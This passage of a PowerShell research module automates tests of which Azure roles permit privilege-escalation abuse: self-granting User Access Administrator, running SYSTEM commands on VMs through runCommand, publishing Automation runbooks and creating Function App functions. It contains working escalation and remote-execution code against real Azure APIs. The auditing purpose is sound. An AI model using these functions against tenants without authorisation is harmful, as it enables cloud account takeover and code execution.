            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PrincipalId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AzureRMRoleID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $body = @{
        properties = @{
            roleDefinitionId    =   $AzureRMRoleID
            principalId         =   $PrincipalId
        }
    }
    $RoleAssignmentGUID = ([GUID]::NewGuid()).toString()

    $URI = "https://management.azure.com/subscriptions/$($TargetObjectID)/providers/Microsoft.Authorization/roleAssignments/$($RoleAssignmentGUID)?api-version=2018-01-01-preview"

    $GrantAzureRMRole = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)"} `
        -URI            $URI `
        -Method         PUT `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $GrantAzureRMRole

}
New-Variable -Name 'New-AzureRMRoleAssignmentDefinition' -Value (Get-Command -Name "New-AzureRMRoleAssignment") -Force
New-Variable -Name 'New-AzureRMRoleAssignmentAst' -Value (${New-AzureRMRoleAssignmentDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureRMRoleAssignments {
    <#
    .SYNOPSIS
        Lists all AzureRM role assignments against a specified object

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Lists all AzureRM role assignments against a specified object

    .PARAMETER TargetObjectID
        The ID of the AzureRM object you are listing role assignments of.

    .PARAMETER Token
        The AzureRM scoped JWT for a principal with the ability to read role assignments scoped to the target object.

    .EXAMPLE
        C:\PS> New-AzureRMRoleAssignments `
            -TargetObjectID "f1816681-4df5-4a31-acfa-922401687008" `
            -Token $ARMToken

        Description
        -----------
        List the Azure role assignments scoped to the object whose ID starts with "f18..."

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetObjectID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
        
    )

    $URI = "https://management.azure.com/$($TargetObjectID)/providers/Microsoft.Authorization/roleAssignments?api-version=2018-01-01-preview&`$filter=atScope()"

    $AzureRMRoleAssignments = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($Token)"} `
        -URI            $URI `
        -Method         GET `
        -ContentType    'application/json'

    $AzureRMRoleAssignments.value.properties

}

Function Invoke-AzureRMVMRunCommand {
    <#
    .SYNOPSIS
        Attempts to run a SYSTEM command on an Azure Virtual Machine via the runCommand endpoint

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Attempts to run a SYSTEM command on an Azure Virtual Machine via the runCommand endpoint

    .PARAMETER TargetVMId
        The unique identifier of the Azure Virtual Machine

    .PARAMETER Token
        The AzureRM-scoped JWT for the principal with the ability to run a command on the VM

    .PARAMETER Script
        The PowerShell script you want to run on the VM

    .EXAMPLE
        C:\PS> Invoke-AzureRMVMRunCommand `
            -Token $ARMToken `
            -TargetVMId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/VirtualMachines/providers/Microsoft.Compute/virtualMachines/MyWin10VirtualMachine" `
            -Script "whoami"

        Description
        -----------
        Attempts to run "whoami" as a SYSTEM command via the runCommand endpoint on the MyWin10VirtualMachine VM.

    .LINK
        https://medium.com/p/74aee1006f48
        https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-privilege-escalation-using-managed-identities/
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetVMId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        $Script

    )

    $URI = "https://management.azure.com/$($TargetVMId)/runCommand?api-version=2018-04-01"
    
    $Body = @{
        commandId = "RunPowerShellScript"
        script = $Script
    }
    
    $RunCommandRequest = Invoke-RestMethod `
        -Uri $URI `
        -Method POST `
        -Headers @{Authorization = "Bearer $Token"} `
        -ContentType "application/json" `
        -Body $($Body | ConvertTo-Json) `
        -ResponseHeadersVariable "Headers"
    
    $AsyncLocation = $Headers.'Azure-AsyncOperation'
    
    $RefreshAttempts = 0
    Do {
      $AsyncJob = Invoke-RestMethod `
        -Uri $AsyncLocation[0] `
        -Method GET `
        -Headers @{Authorization = "Bearer $Token"}
      $RefreshAttempts++
      Start-Sleep -s 6
    } Until (
        $AsyncJob.status -Like "Succeeded" -Or $RefreshAttempts -GT 30
    )
    
    $CommandOutput = $AsyncJob.properties.output.value | ?{$_.code -Like "ComponentStatus/StdOut/succeeded"} | Select -ExpandProperty message
    
    $CommandOutput

}

Function Test-AzureRMAddSelfToAzureRMRole {
    <#
    .SYNOPSIS
        Tests whether a principal can grant itself an AzureRM role

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to grant the associated principal the specified AzureRM role

    .PARAMETER TestPrincipalID
        The ID of the principal you are trying to grant the role to

    .PARAMETER AzureRMRoleDefinitionId
        The globally unique ID of the AzureRM role you are trying to grant the SP

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER UserAccessAdminAzureRMToken
        The AzureRM-scoped JWT for a User Access Admin principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER SubscriptionID
        The unique identifier of the target subscription

    .EXAMPLE
        C:\PS> Test-AzureRMAddSelfToAzureRMRole `
            -TestPrincipalID "26e62392-5291-44a6-a42b-578ddeb0a5cb" `
            -AzureRMRoleDefinitionId "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/18d7d88d-d35e-4fb5-a5c3-7773c20a72d9" `
            -TestToken $TestToken `
            -UserAccessAdminAzureRMToken $ARMToken `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "FHIR Data Importer" `
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008"

        Description
        -----------
        Test whether the supplied JWT can grant its associated principal the User Access Admin role over the entire subscription

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AzureRMRoleDefinitionId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminAzureRMToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID
        
    )

    # Test the principal granting itself "User Access Admin" role over the subscription:
    $body = @{
        properties = @{
            roleDefinitionId   =   $AzureRMRoleDefinitionId
            principalId        =   $TestPrincipalID
        }
    }
    $Success = $False
    Try {
        $RoleAssignmentGUID = ([GUID]::NewGuid()).toString()
        $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Authorization/roleAssignments/$($RoleAssignmentGUID)?api-version=2018-01-01-preview"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -URI $URI `
            -Method PUT `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Promote self to User Access Administrator"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the AzureRM role assignment. Wait 1 minute for the role assignment to have existed before deleting it.
        Start-Sleep -s 60
        
        $DeleteRoleAssignment = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($UserAccessAdminAzureRMToken)"} `
            -URI $URI `
            -Method DELETE
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMAddSelfToAzureRMRoleDefinition' -Value (Get-Command -Name "Test-AzureRMAddSelfToAzureRMRole") -Force
New-Variable -Name 'Test-AzureRMAddSelfToAzureRMRoleAst' -Value (${Test-AzureRMAddSelfToAzureRMRoleDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-AzureRMVMRunCommand {
    <#
    .SYNOPSIS
        Tests whether a principal can run a SYSTEM command via the runCommand endpoint

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to run a SYSTEM command via the runCommand endpoint

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-AzureRMVMRunCommand `
            -TestToken $ARMToken `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "FHIR Data Importer" `
            -VirtualMachinePath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/VirtualMachines/providers/Microsoft.Compute/virtualMachines/MyWin10VirtualMachine"

        Description
        -----------
        Test whether the supplied JWT can run a SYSTEM command via the runCommand endpoint on the MyWin10VirtualMachine VM.

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $VirtualMachinePath
    )

    $URI = "$($VirtualMachinePath)/runCommand?api-version=2018-04-01"
    
    $Body = @{
        commandId = "RunPowerShellScript"
        script = @(
          'whoami'
        )
    }
    
    $Success = $False
    $Count = 0
    Do {
        Try {
            $RunCommandRequest = Invoke-RestMethod `
                -Uri $URI `
                -Method POST `
                -Headers @{Authorization = "Bearer $($TestToken)"} `
                -ContentType "application/json" `
                -Body $($Body | ConvertTo-Json) `
                -ResponseHeadersVariable "Headers"
            $Success = $True
        }
        Catch {
            If ($_.ErrorDetails.Message -Match "AuthorizationFailed") {
                $Success = $False
            }
        }
        $Count++
        Start-Sleep -s 10
    }
    Until ($Success -Or $Count -eq 10 -Or $Success -eq $False)

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Run command on VM via runCommand endpoint"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMVMRunCommandDefinition' -Value (Get-Command -Name "Test-AzureRMVMRunCommand") -Force
New-Variable -Name 'Test-AzureRMVMRunCommandAst' -Value (${Test-AzureRMVMRunCommandDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-AzureRMPublishAutomationAccountRunBook {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can publish a new runbook to an existing automation account

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a Service Principal can publish a new runbook to an existing automation account

    .PARAMETER TestPrincipalDisplayName
        The display name of the test principal

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER SubscriptionID
        The unique identifier of the target subscription

    .EXAMPLE
        C:\PS> Test-AzureRMPublishAutomationAccountRunBook `
            -TestToken $ARMToken `
            -TestPrincipalDisplayName "MyCoolServicePrincipal" `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "Contributor" `
            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"

        Description
        -----------
        Tests whether a principal can publish a new runbook to an existing automation account called "MyCoolAutomationAccount"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalDisplayName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AutomationAccountPath
    )
    
    $Body = @{
        commandId = "RunPowerShellScript"
        script = @(
          'whoami'
        )
    }
   
    $Success = $False
    Try {
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    content = @{
                        name = $AppDisplayName
                        location = "eastus"
                        properties = @{
                            runbookType = "PowerShell7"
                            description = "asdf"
                            logProgress = "false"
                            logVerbose = "false"
                            draft = @{}
                        }
                    }
                    httpMethod = "PUT"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($TestPrincipalDisplayName)?api-version=2017-05-15-preview"
                }
            )
        }
        $CreateDraft = Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 5)

        # Add script to the runbook
        $URI = "$($AutomationAccountPath)/runbooks/$($TestPrincipalDisplayName)/draft/content?api-version=2015-10-31"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -URI $URI `
            -Method PUT `
            -Body "whoami" `
            -ContentType "text/powershell"

        # Publish the runbook
        $RequestGUID = ([GUID]::NewGuid()).toString()
        $body = @{
            requests = @(
                @{
                    httpMethod = "POST"
                    name = $RequestGUID
                    requestHeaderDetails = @{
                        commandName = "Microsoft_Azure_Automation."
                    }
                    url = "$($AutomationAccountPath)/runbooks/$($TestPrincipalDisplayName)/publish?api-version=2018-06-30"
                }
            )
        }
        Invoke-RestMethod `
            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
            -Method "POST" `
            -Headers @{Authorization = "Bearer $($TestToken)"} `
            -ContentType "application/json" `
            -Body $($body |ConvertTo-Json -depth 3)
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Publish a new Automation Account runbook"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMPublishAutomationAccountRunBookDefinition' -Value (Get-Command -Name "Test-AzureRMPublishAutomationAccountRunBook") -Force
New-Variable -Name 'Test-AzureRMPublishAutomationAccountRunBookAst' -Value (${Test-AzureRMPublishAutomationAccountRunBookDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-AzureRMCreateFunction {
    <#
    .SYNOPSIS
        Tests whether a principal can create a new function in an existing Function App

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Tests whether a principal can create a new function in an existing Function App

    .PARAMETER TestPrincipalDisplayName
        The display name of the test principal

    .PARAMETER TestToken
        The AzureRM-scoped JWT for the test principal

    .PARAMETER HeldPrivilege
        The AzureRM role currently held by the test principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER SubscriptionID
        The unique identifier of the target subscription

    .EXAMPLE
        C:\PS> Test-AzureRMCreateFunction `
            -TestToken $ARMToken `
            -TestPrincipalDisplayName "My Cool Service Principal" `
            -TimeOfTest (Get-Date) `
            -HeldPrivilege "Contributor" `
            -PathToFunctionApp "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/FunctionApps/providers/Microsoft.Web/sites/MyCoolFunctionApp"

        Description
        -----------
        Tests whether a principal can create a new function in an existing Function App called "MyCoolFunctionApp"

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalDisplayName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $PathToFunctionApp
    )

    $FunctionName = "a" + ($TestPrincipalDisplayName).Replace(".","_")

    $URI = "$($PathToFunctionApp)/functions/$($FunctionName)?api-version=2018-11-01"
    
    $Body = @{
        id = "$($PathToFunctionApp)/functions/$($FunctionName)"
        properties = @{
            name = $FunctionName
            files = @{
                "run.ps1" = "asdf"
            }
            test_data = "asdf"
            config = @{
                bindings = @(
                    @{
                        authLevel = "function"
                        type = "httpTrigger"
                        direction = "in"
                        name = "Request"
                        methods = @(
                            "get"
                            "post"
                        )
                    }
                    @{
                        type = "http"
                        direction = "out"
                        name = "Response"
                    }
                )
            }
        }
    } | ConvertTo-Json -Depth 5
   
    $Success = $False
    Try {
        $CreateFunction = Invoke-RestMethod `
            -Method PUT `
            -URI $URI `
            -Body $Body `
            -Headers @{
                "authorization"="Bearer $($TestToken)"
            } `
            -ContentType "application/json"
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Publish a new function on a function app"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-AzureRMCreateFunctionDefinition' -Value (Get-Command -Name "Test-AzureRMCreateFunction") -Force
New-Variable -Name 'Test-AzureRMCreateFunctionAst' -Value (${Test-AzureRMCreateFunctionDefinition}.ScriptBlock.Ast.Body) -Force

function Invoke-AzureRMAbuseTests {
    <#
    .SYNOPSIS
        Performs all AzureRM abuse tests, or specified tests against AzureRM objects if specfied with AbuseTestType switch

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Performs abuse tests against the appropriate AzureRM object type

    .PARAMETER GlobalAdminClientID
        The ID of the service principal with Global Admin at the AzureAD tenant level

    .PARAMETER GlobalAdminSecret
        The plain-text password for the Global Admin service principal

    .PARAMETER UserAccessAdminClientID
        The ID of the service principal with User Access Admin role at the subscription

    .PARAMETER UserAccessAdminSecret
        The plain-text password for the User Access Admin service principal

    .PARAMETER TenantName
        The display name of the AzureAD tenant the service principal lives in

    .PARAMETER SubscriptionID
        The ID of the target subscription

    .EXAMPLE
        C:\PS> Invoke-AzureRMAbuseTests `
            -GlobalAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -GlobalAdminSecret "<secret>" `
            -UserAccessAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -UserAccessAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008"

        Description
        -----------
        Perform all abuse tests, determines which available roles are able to perform all known abuse primitives

    .EXAMPLE
        C:\PS> Invoke-AzureRMAbuseTests `
            -GlobalAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -GlobalAdminSecret "<secret>" `
            -UserAccessAdminClientID "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae" `
            -UserAccessAdminSecret "<secret>" `
            -TenantName "contoso.onmicrosoft.com"
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008"
            -AbuseTestType "AzureRMVMRunCommand"

        Description
        -----------
        Perform only the AzureRMVMRunCommand abuse tests, determines which available roles are able to perform that specific abuse primitive

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminSecret,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminClientID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminSecret,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TenantName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $AbuseTestType,

        [Parameter(
            Mandatory = $False,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetVirtualMachinePath
        
    )

    $UserAccessAdminToken = (Get-AzureRMTokenWithClientCredentials `
        -ClientID       $UserAccessAdminClientID `
        -ClientSecret   $UserAccessAdminSecret `
        -TenantName     $TenantName).access_token

    # Create a unique identifier for this test. Abuse test Service Principal display names will start with this string.
    $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]

    # Create thread-safe collections object to receive output
    $AzureRMTestResults = [System.Collections.Concurrent.ConcurrentBag[PSObject]]::New()

    # Get all current AzureRM roles:
    $SubRoles = Get-AzureRMRoleDefinitions -Token $UserAccessAdminToken -SubscriptionID $SubscriptionID

    # Perform all abuse tests, creating a unique Service Principal per AzureRM role:
    $SubRoles | ?{$_.AzureRMRoleDisplayName -Match "Virtual Machine"} | ForEach-Object -ThrottleLimit 50 -Parallel {
    #$SubRoles | ForEach-Object -ThrottleLimit 50 -Parallel {

        $AzureRMRoleDisplayName = $_.AzureRMRoleDisplayName

        # Import and later call our functions in a thread-safe way
        # https://github.com/PowerShell/PowerShell/issues/16461#issuecomment-967759037
        If (-Not ${global:New-TestAppReg})                                  { $ast = ${using:New-TestAppRegAst};                                ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                                      { $ast = ${using:New-TestSPAst};                                    ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AppRegSecret})                                { $ast = ${using:New-AppRegSecretAst};                              ${global:New-AppRegSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AzureRMRoleAssignment})                       { $ast = ${using:New-AzureRMRoleAssignmentAst};                     ${global:New-AzureRMRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMAddSelfToAzureRMRole})                { $ast = ${using:Test-AzureRMAddSelfToAzureRMRoleAst};              ${global:Test-AzureRMAddSelfToAzureRMRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMVMRunCommand})                        { $ast = ${using:Test-AzureRMVMRunCommandAst};                      ${global:Test-AzureRMVMRunCommand} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMPublishAutomationAccountRunBook})     { $ast = ${using:Test-AzureRMPublishAutomationAccountRunBookAst};   ${global:Test-AzureRMPublishAutomationAccountRunBook} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMCreateFunction})                      { $ast = ${using:Test-AzureRMCreateFunctionAst};                    ${global:Test-AzureRMCreateFunction} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})           { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst};         ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-AzureRMTokenWithClientCredentials})           { $ast = ${using:Get-AzureRMTokenWithClientCredentialsAst};         ${global:Get-AzureRMTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeUserAccessAdminToken = (& ${global:Get-AzureRMTokenWithClientCredentials} `
            -ClientID ${using:UserAccessAdminClientID} `
            -ClientSecret ${using:UserAccessAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $AzureRMRoleDisplayName)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-AppRegSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the AzureRM role to the test SP:
        Start-Sleep 60s

        # Grant the AzureRM Role to the SP
        $AzureRMRoleAssign = (& ${global:New-AzureRMRoleAssignment} `
            -PrincipalId $ThreadSafeSP.SPObjectId `
            -AzureRMRoleID $_.AzureRMRoleID `
            -TargetObjectID $using:SubscriptionID `
            -Token $ThreadSafeUserAccessAdminToken.access_token
        )
        #Wait 5 minutes for the role assignment to take effect
        Start-Sleep 300s

        # Get test token
        $ThreadSafeTestToken = (& ${global:Get-AzureRMTokenWithClientCredentials} `
            -ClientID       $ThreadSafeSecret.AppRegAppId `
            -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
            -TenantName     ${using:TenantName}
        )

        Switch (${using:AbuseTestType}) {

            AzureRMVMRunCommand {
                $ThreadSafeTest = (& ${global:Test-AzureRMVMRunCommand} `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -HeldPrivilege          $AzureRMRoleDisplayName `
                    -TimeOfTest             $(Get-Date) `
                    -VirtualMachinePath     ${using:TargetVirtualMachinePath} 
                )
